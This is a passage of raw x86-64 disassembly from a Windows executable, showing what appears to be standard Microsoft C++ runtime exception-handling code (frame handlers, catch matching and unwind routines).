   1400032c8:	84 c0                	test   %al,%al
   1400032ca:	0f 85 c6 00 00 00    	jne    0x140003396
   1400032d0:	8b 47 24             	mov    0x24(%rdi),%eax
   1400032d3:	c1 e8 02             	shr    $0x2,%eax
   1400032d6:	a8 01                	test   $0x1,%al
   1400032d8:	0f 85 0e 01 00 00    	jne    0x1400033ec
   1400032de:	83 7f 20 00          	cmpl   $0x0,0x20(%rdi)
   1400032e2:	74 11                	je     0x1400032f5
   1400032e4:	e8 cb f6 ff ff       	call   0x1400029b4
   1400032e9:	48 8b d0             	mov    %rax,%rdx
   1400032ec:	48 63 47 20          	movslq 0x20(%rdi),%rax
   1400032f0:	48 03 d0             	add    %rax,%rdx
   1400032f3:	eb 02                	jmp    0x1400032f7
   1400032f5:	33 d2                	xor    %edx,%edx
   1400032f7:	48 8b cb             	mov    %rbx,%rcx
   1400032fa:	e8 7d 0c 00 00       	call   0x140003f7c
   1400032ff:	84 c0                	test   %al,%al
   140003301:	0f 85 8f 00 00 00    	jne    0x140003396
   140003307:	4c 8d 4d 80          	lea    -0x80(%rbp),%r9
   14000330b:	4c 8b c7             	mov    %rdi,%r8
   14000330e:	48 8b d6             	mov    %rsi,%rdx
   140003311:	49 8b cc             	mov    %r12,%rcx
   140003314:	e8 03 f3 ff ff       	call   0x14000261c
   140003319:	8a 8d 98 00 00 00    	mov    0x98(%rbp),%cl
   14000331f:	4c 8b c8             	mov    %rax,%r9
   140003322:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140003327:	48 8b d3             	mov    %rbx,%rdx
   14000332a:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   14000332e:	83 c9 ff             	or     $0xffffffff,%ecx
   140003331:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140003336:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000333c:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   140003340:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   140003344:	49 8b cc             	mov    %r12,%rcx
   140003347:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   14000334c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140003352:	e8 c9 f4 ff ff       	call   0x140002820
   140003357:	eb 3d                	jmp    0x140003396
   140003359:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   14000335d:	76 37                	jbe    0x140003396
   14000335f:	80 bd 98 00 00 00 00 	cmpb   $0x0,0x98(%rbp)
   140003366:	0f 85 9d 00 00 00    	jne    0x140003409
   14000336c:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   140003372:	4c 8b ce             	mov    %rsi,%r9
   140003375:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   14000337a:	4d 8b c7             	mov    %r15,%r8
   14000337d:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140003381:	49 8b d4             	mov    %r12,%rdx
   140003384:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140003389:	48 8b cb             	mov    %rbx,%rcx
   14000338c:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003391:	e8 7a 00 00 00       	call   0x140003410
   140003396:	e8 91 ec ff ff       	call   0x14000202c
   14000339b:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   1400033a0:	75 67                	jne    0x140003409
   1400033a2:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   1400033a6:	48 33 cc             	xor    %rsp,%rcx
   1400033a9:	e8 22 98 00 00       	call   0x14000cbd0
   1400033ae:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
   1400033b5:	41 5f                	pop    %r15
   1400033b7:	41 5e                	pop    %r14
   1400033b9:	41 5d                	pop    %r13
   1400033bb:	41 5c                	pop    %r12
   1400033bd:	5f                   	pop    %rdi
   1400033be:	5e                   	pop    %rsi
   1400033bf:	5b                   	pop    %rbx
   1400033c0:	5d                   	pop    %rbp
   1400033c1:	c3                   	ret
   1400033c2:	b2 01                	mov    $0x1,%dl
   1400033c4:	48 8b cb             	mov    %rbx,%rcx
   1400033c7:	e8 38 ea ff ff       	call   0x140001e04
   1400033cc:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   1400033d0:	e8 67 06 00 00       	call   0x140003a3c
   1400033d5:	48 8d 15 84 3a 01 00 	lea    0x13a84(%rip),%rdx        # 0x140016e60
   1400033dc:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   1400033e0:	e8 83 0e 00 00       	call   0x140004268
   1400033e5:	cc                   	int3
   1400033e6:	e8 35 22 00 00       	call   0x140005620
   1400033eb:	cc                   	int3
   1400033ec:	e8 3b ec ff ff       	call   0x14000202c
   1400033f1:	48 89 58 20          	mov    %rbx,0x20(%rax)
   1400033f5:	e8 32 ec ff ff       	call   0x14000202c
   1400033fa:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   1400033ff:	48 89 48 28          	mov    %rcx,0x28(%rax)
   140003403:	e8 18 22 00 00       	call   0x140005620
   140003408:	cc                   	int3
   140003409:	e8 ba 22 00 00       	call   0x1400056c8
   14000340e:	cc                   	int3
   14000340f:	cc                   	int3
   140003410:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003415:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000341a:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000341f:	55                   	push   %rbp
   140003420:	56                   	push   %rsi
   140003421:	57                   	push   %rdi
   140003422:	41 54                	push   %r12
   140003424:	41 55                	push   %r13
   140003426:	41 56                	push   %r14
   140003428:	41 57                	push   %r15
   14000342a:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   140003431:	81 39 03 00 00 80    	cmpl   $0x80000003,(%rcx)
   140003437:	49 8b e9             	mov    %r9,%rbp
   14000343a:	4d 8b e0             	mov    %r8,%r12
   14000343d:	4c 8b f2             	mov    %rdx,%r14
   140003440:	48 8b f1             	mov    %rcx,%rsi
   140003443:	0f 84 13 02 00 00    	je     0x14000365c
   140003449:	e8 de eb ff ff       	call   0x14000202c
   14000344e:	44 8b ac 24 30 01 00 	mov    0x130(%rsp),%r13d
   140003455:	00 
   140003456:	44 8b bc 24 28 01 00 	mov    0x128(%rsp),%r15d
   14000345d:	00 
   14000345e:	48 8b bc 24 20 01 00 	mov    0x120(%rsp),%rdi
   140003465:	00 
   140003466:	48 83 78 10 00       	cmpq   $0x0,0x10(%rax)
   14000346b:	74 5b                	je     0x1400034c8
   14000346d:	33 c9                	xor    %ecx,%ecx
   14000346f:	ff 15 83 ac 00 00    	call   *0xac83(%rip)        # 0x14000e0f8
   140003475:	48 8b d8             	mov    %rax,%rbx
   140003478:	e8 af eb ff ff       	call   0x14000202c
   14000347d:	48 39 58 10          	cmp    %rbx,0x10(%rax)
   140003481:	74 45                	je     0x1400034c8
   140003483:	81 3e 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rsi)
   140003489:	74 3d                	je     0x1400034c8
   14000348b:	81 3e 52 43 43 e0    	cmpl   $0xe0434352,(%rsi)
   140003491:	74 35                	je     0x1400034c8
   140003493:	48 8b 84 24 38 01 00 	mov    0x138(%rsp),%rax
   14000349a:	00 
   14000349b:	4c 8b cd             	mov    %rbp,%r9
   14000349e:	44 89 7c 24 38       	mov    %r15d,0x38(%rsp)
   1400034a3:	4d 8b c4             	mov    %r12,%r8
   1400034a6:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400034ab:	49 8b d6             	mov    %r14,%rdx
   1400034ae:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   1400034b3:	48 8b ce             	mov    %rsi,%rcx
   1400034b6:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400034bb:	e8 14 f0 ff ff       	call   0x1400024d4
   1400034c0:	85 c0                	test   %eax,%eax
   1400034c2:	0f 85 94 01 00 00    	jne    0x14000365c
   1400034c8:	48 8b 45 08          	mov    0x8(%rbp),%rax
   1400034cc:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1400034d1:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   1400034d6:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   1400034da:	0f 86 97 01 00 00    	jbe    0x140003677
   1400034e0:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   1400034e5:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400034ea:	4c 8b cd             	mov    %rbp,%r9
   1400034ed:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400034f2:	45 8b c7             	mov    %r15d,%r8d
   1400034f5:	48 8d 8c 24 98 00 00 	lea    0x98(%rsp),%rcx
   1400034fc:	00 
   1400034fd:	e8 ea f1 ff ff       	call   0x1400026ec
   140003502:	0f 10 8c 24 98 00 00 	movups 0x98(%rsp),%xmm1
   140003509:	00 
   14000350a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   14000350e:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140003513:	66 0f 7e c0          	movd   %xmm0,%eax
   140003517:	f3 0f 7f 4c 24 70    	movdqu %xmm1,0x70(%rsp)
   14000351d:	3b 84 24 b0 00 00 00 	cmp    0xb0(%rsp),%eax
   140003524:	0f 83 32 01 00 00    	jae    0x14000365c
   14000352a:	44 8b 74 24 78       	mov    0x78(%rsp),%r14d
   14000352f:	66 49 0f 7e c9       	movq   %xmm1,%r9
   140003534:	4c 89 8c 24 00 01 00 	mov    %r9,0x100(%rsp)
   14000353b:	00 
   14000353c:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140003541:	48 8b 00             	mov    (%rax),%rax
   140003544:	48 63 50 10          	movslq 0x10(%rax),%rdx
   140003548:	41 8b c6             	mov    %r14d,%eax
   14000354b:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   14000354f:	49 8b 41 08          	mov    0x8(%r9),%rax
   140003553:	4c 8d 04 8a          	lea    (%rdx,%rcx,4),%r8
   140003557:	41 0f 10 04 00       	movups (%r8,%rax,1),%xmm0
   14000355c:	49 63 54 00 10       	movslq 0x10(%r8,%rax,1),%rdx
   140003561:	89 94 24 90 00 00 00 	mov    %edx,0x90(%rsp)
   140003568:	66 0f 7e c0          	movd   %xmm0,%eax
   14000356c:	0f 11 84 24 80 00 00 	movups %xmm0,0x80(%rsp)
   140003573:	00 
   140003574:	41 3b c7             	cmp    %r15d,%eax
   140003577:	0f 8f be 00 00 00    	jg     0x14000363b
   14000357d:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140003582:	48 c1 e8 20          	shr    $0x20,%rax
   140003586:	44 3b f8             	cmp    %eax,%r15d
   140003589:	0f 8f ac 00 00 00    	jg     0x14000363b
   14000358f:	48 8b 5d 08          	mov    0x8(%rbp),%rbx
   140003593:	48 83 c3 ec          	add    $0xffffffffffffffec,%rbx
   140003597:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   14000359c:	66 48 0f 7e c0       	movq   %xmm0,%rax
   1400035a1:	48 c1 e8 20          	shr    $0x20,%rax
   1400035a5:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400035a9:	48 8d 14 8a          	lea    (%rdx,%rcx,4),%rdx
   1400035ad:	48 03 da             	add    %rdx,%rbx
   1400035b0:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   1400035b4:	74 31                	je     0x1400035e7
   1400035b6:	4c 63 63 04          	movslq 0x4(%rbx),%r12
   1400035ba:	e8 f5 f3 ff ff       	call   0x1400029b4
   1400035bf:	49 03 c4             	add    %r12,%rax
   1400035c2:	74 1b                	je     0x1400035df
   1400035c4:	45 85 e4             	test   %r12d,%r12d
   1400035c7:	74 0e                	je     0x1400035d7
   1400035c9:	e8 e6 f3 ff ff       	call   0x1400029b4
   1400035ce:	48 63 4b 04          	movslq 0x4(%rbx),%rcx
   1400035d2:	48 03 c1             	add    %rcx,%rax
   1400035d5:	eb 02                	jmp    0x1400035d9
   1400035d7:	33 c0                	xor    %eax,%eax
   1400035d9:	80 78 10 00          	cmpb   $0x0,0x10(%rax)
   1400035dd:	75 5c                	jne    0x14000363b
   1400035df:	4c 8b a4 24 10 01 00 	mov    0x110(%rsp),%r12
   1400035e6:	00 
   1400035e7:	f6 03 40             	testb  $0x40,(%rbx)
   1400035ea:	75 4f                	jne    0x14000363b
   1400035ec:	48 8b 84 24 38 01 00 	mov    0x138(%rsp),%rax
   1400035f3:	00 
   1400035f4:	4c 8b cd             	mov    %rbp,%r9
   1400035f7:	48 8b 94 24 08 01 00 	mov    0x108(%rsp),%rdx
   1400035fe:	00 
   1400035ff:	4d 8b c4             	mov    %r12,%r8
   140003602:	c6 44 24 58 00       	movb   $0x0,0x58(%rsp)
   140003607:	48 8b ce             	mov    %rsi,%rcx
   14000360a:	c6 44 24 50 01       	movb   $0x1,0x50(%rsp)
   14000360f:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140003614:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   14000361b:	00 
   14000361c:	44 89 6c 24 40       	mov    %r13d,0x40(%rsp)
   140003621:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003626:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000362c:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140003631:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003636:	e8 31 f8 ff ff       	call   0x140002e6c
   14000363b:	4c 8b a4 24 10 01 00 	mov    0x110(%rsp),%r12
   140003642:	00 
   140003643:	41 ff c6             	inc    %r14d
   140003646:	4c 8b 8c 24 00 01 00 	mov    0x100(%rsp),%r9
   14000364d:	00 
   14000364e:	44 3b b4 24 b0 00 00 	cmp    0xb0(%rsp),%r14d
   140003655:	00 
   140003656:	0f 82 e0 fe ff ff    	jb     0x14000353c
   14000365c:	48 8b 9c 24 18 01 00 	mov    0x118(%rsp),%rbx
   140003663:	00 
   140003664:	48 81 c4 c0 00 00 00 	add    $0xc0,%rsp
   14000366b:	41 5f                	pop    %r15
   14000366d:	41 5e                	pop    %r14
   14000366f:	41 5d                	pop    %r13
   140003671:	41 5c                	pop    %r12
   140003673:	5f                   	pop    %rdi
   140003674:	5e                   	pop    %rsi
   140003675:	5d                   	pop    %rbp
   140003676:	c3                   	ret
   140003677:	e8 4c 20 00 00       	call   0x1400056c8
   14000367c:	cc                   	int3
   14000367d:	cc                   	int3
   14000367e:	cc                   	int3
   14000367f:	cc                   	int3
   140003680:	48 8b c4             	mov    %rsp,%rax
   140003683:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003687:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000368b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000368f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003693:	41 56                	push   %r14
   140003695:	48 83 ec 20          	sub    $0x20,%rsp
   140003699:	33 db                	xor    %ebx,%ebx
   14000369b:	4d 8b f0             	mov    %r8,%r14
   14000369e:	48 8b ea             	mov    %rdx,%rbp
   1400036a1:	48 8b f9             	mov    %rcx,%rdi
   1400036a4:	39 59 04             	cmp    %ebx,0x4(%rcx)
   1400036a7:	0f 84 f0 00 00 00    	je     0x14000379d
   1400036ad:	48 63 71 04          	movslq 0x4(%rcx),%rsi
   1400036b1:	e8 fe f2 ff ff       	call   0x1400029b4
   1400036b6:	4c 8b c8             	mov    %rax,%r9
   1400036b9:	4c 03 ce             	add    %rsi,%r9
   1400036bc:	0f 84 db 00 00 00    	je     0x14000379d
   1400036c2:	85 f6                	test   %esi,%esi
   1400036c4:	74 0f                	je     0x1400036d5
   1400036c6:	48 63 77 04          	movslq 0x4(%rdi),%rsi
   1400036ca:	e8 e5 f2 ff ff       	call   0x1400029b4
   1400036cf:	48 8d 0c 06          	lea    (%rsi,%rax,1),%rcx
   1400036d3:	eb 05                	jmp    0x1400036da
   1400036d5:	48 8b cb             	mov    %rbx,%rcx
   1400036d8:	8b f3                	mov    %ebx,%esi
   1400036da:	38 59 10             	cmp    %bl,0x10(%rcx)
   1400036dd:	0f 84 ba 00 00 00    	je     0x14000379d
   1400036e3:	f6 07 80             	testb  $0x80,(%rdi)
   1400036e6:	74 0a                	je     0x1400036f2
   1400036e8:	f6 45 00 10          	testb  $0x10,0x0(%rbp)
   1400036ec:	0f 85 ab 00 00 00    	jne    0x14000379d
   1400036f2:	85 f6                	test   %esi,%esi
   1400036f4:	74 11                	je     0x140003707
   1400036f6:	e8 b9 f2 ff ff       	call   0x1400029b4
   1400036fb:	48 8b f0             	mov    %rax,%rsi
   1400036fe:	48 63 47 04          	movslq 0x4(%rdi),%rax
   140003702:	48 03 f0             	add    %rax,%rsi
   140003705:	eb 03                	jmp    0x14000370a
   140003707:	48 8b f3             	mov    %rbx,%rsi
   14000370a:	e8 b9 f2 ff ff       	call   0x1400029c8
   14000370f:	48 8b c8             	mov    %rax,%rcx
   140003712:	48 63 45 04          	movslq 0x4(%rbp),%rax
   140003716:	48 03 c8             	add    %rax,%rcx
   140003719:	48 3b f1             	cmp    %rcx,%rsi
   14000371c:	74 4b                	je     0x140003769
   14000371e:	39 5f 04             	cmp    %ebx,0x4(%rdi)
   140003721:	74 11                	je     0x140003734
   140003723:	e8 8c f2 ff ff       	call   0x1400029b4
   140003728:	48 8b f0             	mov    %rax,%rsi
   14000372b:	48 63 47 04          	movslq 0x4(%rdi),%rax
   14000372f:	48 03 f0             	add    %rax,%rsi
   140003732:	eb 03                	jmp    0x140003737
   140003734:	48 8b f3             	mov    %rbx,%rsi
   140003737:	e8 8c f2 ff ff       	call   0x1400029c8
   14000373c:	4c 63 45 04          	movslq 0x4(%rbp),%r8
   140003740:	49 83 c0 10          	add    $0x10,%r8
   140003744:	4c 03 c0             	add    %rax,%r8
   140003747:	48 8d 46 10          	lea    0x10(%rsi),%rax
   14000374b:	4c 2b c0             	sub    %rax,%r8
   14000374e:	0f b6 08             	movzbl (%rax),%ecx
   140003751:	42 0f b6 14 00       	movzbl (%rax,%r8,1),%edx
   140003756:	2b ca                	sub    %edx,%ecx
   140003758:	75 07                	jne    0x140003761
   14000375a:	48 ff c0             	inc    %rax
   14000375d:	85 d2                	test   %edx,%edx
   14000375f:	75 ed                	jne    0x14000374e
   140003761:	85 c9                	test   %ecx,%ecx
   140003763:	74 04                	je     0x140003769
   140003765:	33 c0                	xor    %eax,%eax
   140003767:	eb 39                	jmp    0x1400037a2
   140003769:	b0 02                	mov    $0x2,%al
   14000376b:	84 45 00             	test   %al,0x0(%rbp)
   14000376e:	74 05                	je     0x140003775
   140003770:	f6 07 08             	testb  $0x8,(%rdi)
   140003773:	74 24                	je     0x140003799
   140003775:	41 f6 06 01          	testb  $0x1,(%r14)
   140003779:	74 05                	je     0x140003780
   14000377b:	f6 07 01             	testb  $0x1,(%rdi)
   14000377e:	74 19                	je     0x140003799
   140003780:	41 f6 06 04          	testb  $0x4,(%r14)
   140003784:	74 05                	je     0x14000378b
   140003786:	f6 07 04             	testb  $0x4,(%rdi)
   140003789:	74 0e                	je     0x140003799
   14000378b:	41 84 06             	test   %al,(%r14)
   14000378e:	74 04                	je     0x140003794
   140003790:	84 07                	test   %al,(%rdi)
   140003792:	74 05                	je     0x140003799
   140003794:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003799:	8b c3                	mov    %ebx,%eax
   14000379b:	eb 05                	jmp    0x1400037a2
   14000379d:	b8 01 00 00 00       	mov    $0x1,%eax
   1400037a2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400037a7:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400037ac:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400037b1:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400037b6:	48 83 c4 20          	add    $0x20,%rsp
   1400037ba:	41 5e                	pop    %r14
   1400037bc:	c3                   	ret
   1400037bd:	cc                   	int3
   1400037be:	cc                   	int3
   1400037bf:	cc                   	int3
   1400037c0:	48 8b c4             	mov    %rsp,%rax
   1400037c3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400037c7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400037cb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400037cf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400037d3:	41 56                	push   %r14
   1400037d5:	48 83 ec 60          	sub    $0x60,%rsp
   1400037d9:	48 8b f9             	mov    %rcx,%rdi
   1400037dc:	49 8b f1             	mov    %r9,%rsi
   1400037df:	49 8b c8             	mov    %r8,%rcx
   1400037e2:	4d 8b f0             	mov    %r8,%r14
   1400037e5:	48 8b ea             	mov    %rdx,%rbp
   1400037e8:	e8 e7 e7 ff ff       	call   0x140001fd4
   1400037ed:	e8 3a e8 ff ff       	call   0x14000202c
   1400037f2:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400037f9:	00 
   1400037fa:	b9 29 00 00 80       	mov    $0x80000029,%ecx
   1400037ff:	ba 26 00 00 80       	mov    $0x80000026,%edx
   140003804:	83 78 40 00          	cmpl   $0x0,0x40(%rax)
   140003808:	75 38                	jne    0x140003842
   14000380a:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140003810:	74 30                	je     0x140003842
   140003812:	39 0f                	cmp    %ecx,(%rdi)
   140003814:	75 10                	jne    0x140003826
   140003816:	83 7f 18 0f          	cmpl   $0xf,0x18(%rdi)
   14000381a:	75 0e                	jne    0x14000382a
   14000381c:	48 81 7f 60 20 05 93 	cmpq   $0x19930520,0x60(%rdi)
   140003823:	19 
   140003824:	74 1c                	je     0x140003842
   140003826:	39 17                	cmp    %edx,(%rdi)
   140003828:	74 18                	je     0x140003842
   14000382a:	8b 03                	mov    (%rbx),%eax
   14000382c:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   140003831:	3d 22 05 93 19       	cmp    $0x19930522,%eax
   140003836:	72 0a                	jb     0x140003842
   140003838:	f6 43 24 01          	testb  $0x1,0x24(%rbx)
   14000383c:	0f 85 8f 01 00 00    	jne    0x1400039d1
   140003842:	f6 47 04 66          	testb  $0x66,0x4(%rdi)
   140003846:	0f 84 8e 00 00 00    	je     0x1400038da
   14000384c:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140003850:	0f 84 7b 01 00 00    	je     0x1400039d1
   140003856:	83 bc 24 98 00 00 00 	cmpl   $0x0,0x98(%rsp)
   14000385d:	00 
   14000385e:	0f 85 6d 01 00 00    	jne    0x1400039d1
   140003864:	f6 47 04 20          	testb  $0x20,0x4(%rdi)
   140003868:	74 5d                	je     0x1400038c7
   14000386a:	39 17                	cmp    %edx,(%rdi)
   14000386c:	75 37                	jne    0x1400038a5
   14000386e:	4c 8b 46 20          	mov    0x20(%rsi),%r8
   140003872:	48 8b d6             	mov    %rsi,%rdx
   140003875:	48 8b cb             	mov    %rbx,%rcx
   140003878:	e8 c7 f2 ff ff       	call   0x140002b44
   14000387d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003880:	0f 8c 6b 01 00 00    	jl     0x1400039f1
   140003886:	3b 43 04             	cmp    0x4(%rbx),%eax
   140003889:	0f 8d 62 01 00 00    	jge    0x1400039f1
   14000388f:	44 8b c8             	mov    %eax,%r9d
   140003892:	48 8b cd             	mov    %rbp,%rcx
   140003895:	48 8b d6             	mov    %rsi,%rdx
   140003898:	4c 8b c3             	mov    %rbx,%r8
   14000389b:	e8 b8 04 00 00       	call   0x140003d58
   1400038a0:	e9 2c 01 00 00       	jmp    0x1400039d1
   1400038a5:	39 0f                	cmp    %ecx,(%rdi)
   1400038a7:	75 1e                	jne    0x1400038c7
   1400038a9:	44 8b 4f 38          	mov    0x38(%rdi),%r9d
   1400038ad:	41 83 f9 ff          	cmp    $0xffffffff,%r9d
   1400038b1:	0f 8c 3a 01 00 00    	jl     0x1400039f1
   1400038b7:	44 3b 4b 04          	cmp    0x4(%rbx),%r9d
   1400038bb:	0f 8d 30 01 00 00    	jge    0x1400039f1
   1400038c1:	48 8b 4f 28          	mov    0x28(%rdi),%rcx
   1400038c5:	eb ce                	jmp    0x140003895
   1400038c7:	4c 8b c3             	mov    %rbx,%r8
   1400038ca:	48 8b d6             	mov    %rsi,%rdx
   1400038cd:	48 8b cd             	mov    %rbp,%rcx
   1400038d0:	e8 e3 ec ff ff       	call   0x1400025b8
   1400038d5:	e9 f7 00 00 00       	jmp    0x1400039d1
   1400038da:	83 7b 0c 00          	cmpl   $0x0,0xc(%rbx)
   1400038de:	75 42                	jne    0x140003922
   1400038e0:	8b 03                	mov    (%rbx),%eax
   1400038e2:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   1400038e7:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   1400038ec:	72 14                	jb     0x140003902
   1400038ee:	83 7b 20 00          	cmpl   $0x0,0x20(%rbx)
   1400038f2:	74 0e                	je     0x140003902
   1400038f4:	e8 bb f0 ff ff       	call   0x1400029b4
   1400038f9:	48 63 4b 20          	movslq 0x20(%rbx),%rcx
   1400038fd:	48 03 c1             	add    %rcx,%rax
   140003900:	75 20                	jne    0x140003922
   140003902:	8b 03                	mov    (%rbx),%eax
   140003904:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   140003909:	3d 22 05 93 19       	cmp    $0x19930522,%eax
   14000390e:	0f 82 bd 00 00 00    	jb     0x1400039d1
   140003914:	8b 43 24             	mov    0x24(%rbx),%eax
   140003917:	c1 e8 02             	shr    $0x2,%eax
   14000391a:	a8 01                	test   $0x1,%al
   14000391c:	0f 84 af 00 00 00    	je     0x1400039d1
   140003922:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140003928:	75 6e                	jne    0x140003998
   14000392a:	83 7f 18 03          	cmpl   $0x3,0x18(%rdi)
   14000392e:	72 68                	jb     0x140003998
   140003930:	81 7f 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rdi)
   140003937:	76 5f                	jbe    0x140003998
   140003939:	48 8b 47 30          	mov    0x30(%rdi),%rax
   14000393d:	83 78 08 00          	cmpl   $0x0,0x8(%rax)
   140003941:	74 55                	je     0x140003998
   140003943:	e8 80 f0 ff ff       	call   0x1400029c8
   140003948:	48 8b 4f 30          	mov    0x30(%rdi),%rcx
   14000394c:	4c 8b d0             	mov    %rax,%r10
   14000394f:	48 63 51 08          	movslq 0x8(%rcx),%rdx
   140003953:	4c 03 d2             	add    %rdx,%r10
   140003956:	74 40                	je     0x140003998
   140003958:	0f b6 8c 24 a8 00 00 	movzbl 0xa8(%rsp),%ecx
   14000395f:	00 
   140003960:	4c 8b ce             	mov    %rsi,%r9
   140003963:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   14000396a:	4d 8b c6             	mov    %r14,%r8
   14000396d:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   140003971:	48 8b d5             	mov    %rbp,%rdx
   140003974:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
   14000397b:	00 
   14000397c:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003981:	48 8b cf             	mov    %rdi,%rcx
   140003984:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140003988:	49 8b c2             	mov    %r10,%rax
   14000398b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003990:	ff 15 ca a8 00 00    	call   *0xa8ca(%rip)        # 0x14000e260
   140003996:	eb 3e                	jmp    0x1400039d6
   140003998:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   14000399f:	00 
   1400039a0:	4c 8b ce             	mov    %rsi,%r9
   1400039a3:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400039a8:	4d 8b c6             	mov    %r14,%r8
   1400039ab:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   1400039b2:	48 8b d5             	mov    %rbp,%rdx
   1400039b5:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400039b9:	48 8b cf             	mov    %rdi,%rcx
   1400039bc:	8a 84 24 a8 00 00 00 	mov    0xa8(%rsp),%al
   1400039c3:	88 44 24 28          	mov    %al,0x28(%rsp)
   1400039c7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400039cc:	e8 6f f5 ff ff       	call   0x140002f40
   1400039d1:	b8 01 00 00 00       	mov    $0x1,%eax
   1400039d6:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   1400039db:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400039df:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   1400039e3:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1400039e7:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   1400039eb:	49 8b e3             	mov    %r11,%rsp
   1400039ee:	41 5e                	pop    %r14
   1400039f0:	c3                   	ret
   1400039f1:	e8 d2 1c 00 00       	call   0x1400056c8
   1400039f6:	cc                   	int3
   1400039f7:	cc                   	int3
   1400039f8:	e9 c3 fd ff ff       	jmp    0x1400037c0
   1400039fd:	cc                   	int3
   1400039fe:	cc                   	int3
   1400039ff:	cc                   	int3
   140003a00:	40 53                	rex push %rbx
   140003a02:	48 83 ec 20          	sub    $0x20,%rsp
   140003a06:	48 8b d9             	mov    %rcx,%rbx
   140003a09:	48 8b c2             	mov    %rdx,%rax
   140003a0c:	48 8d 0d 0d b9 00 00 	lea    0xb90d(%rip),%rcx        # 0x14000f320
   140003a13:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003a16:	48 89 0b             	mov    %rcx,(%rbx)
   140003a19:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140003a1d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140003a21:	0f 11 02             	movups %xmm0,(%rdx)
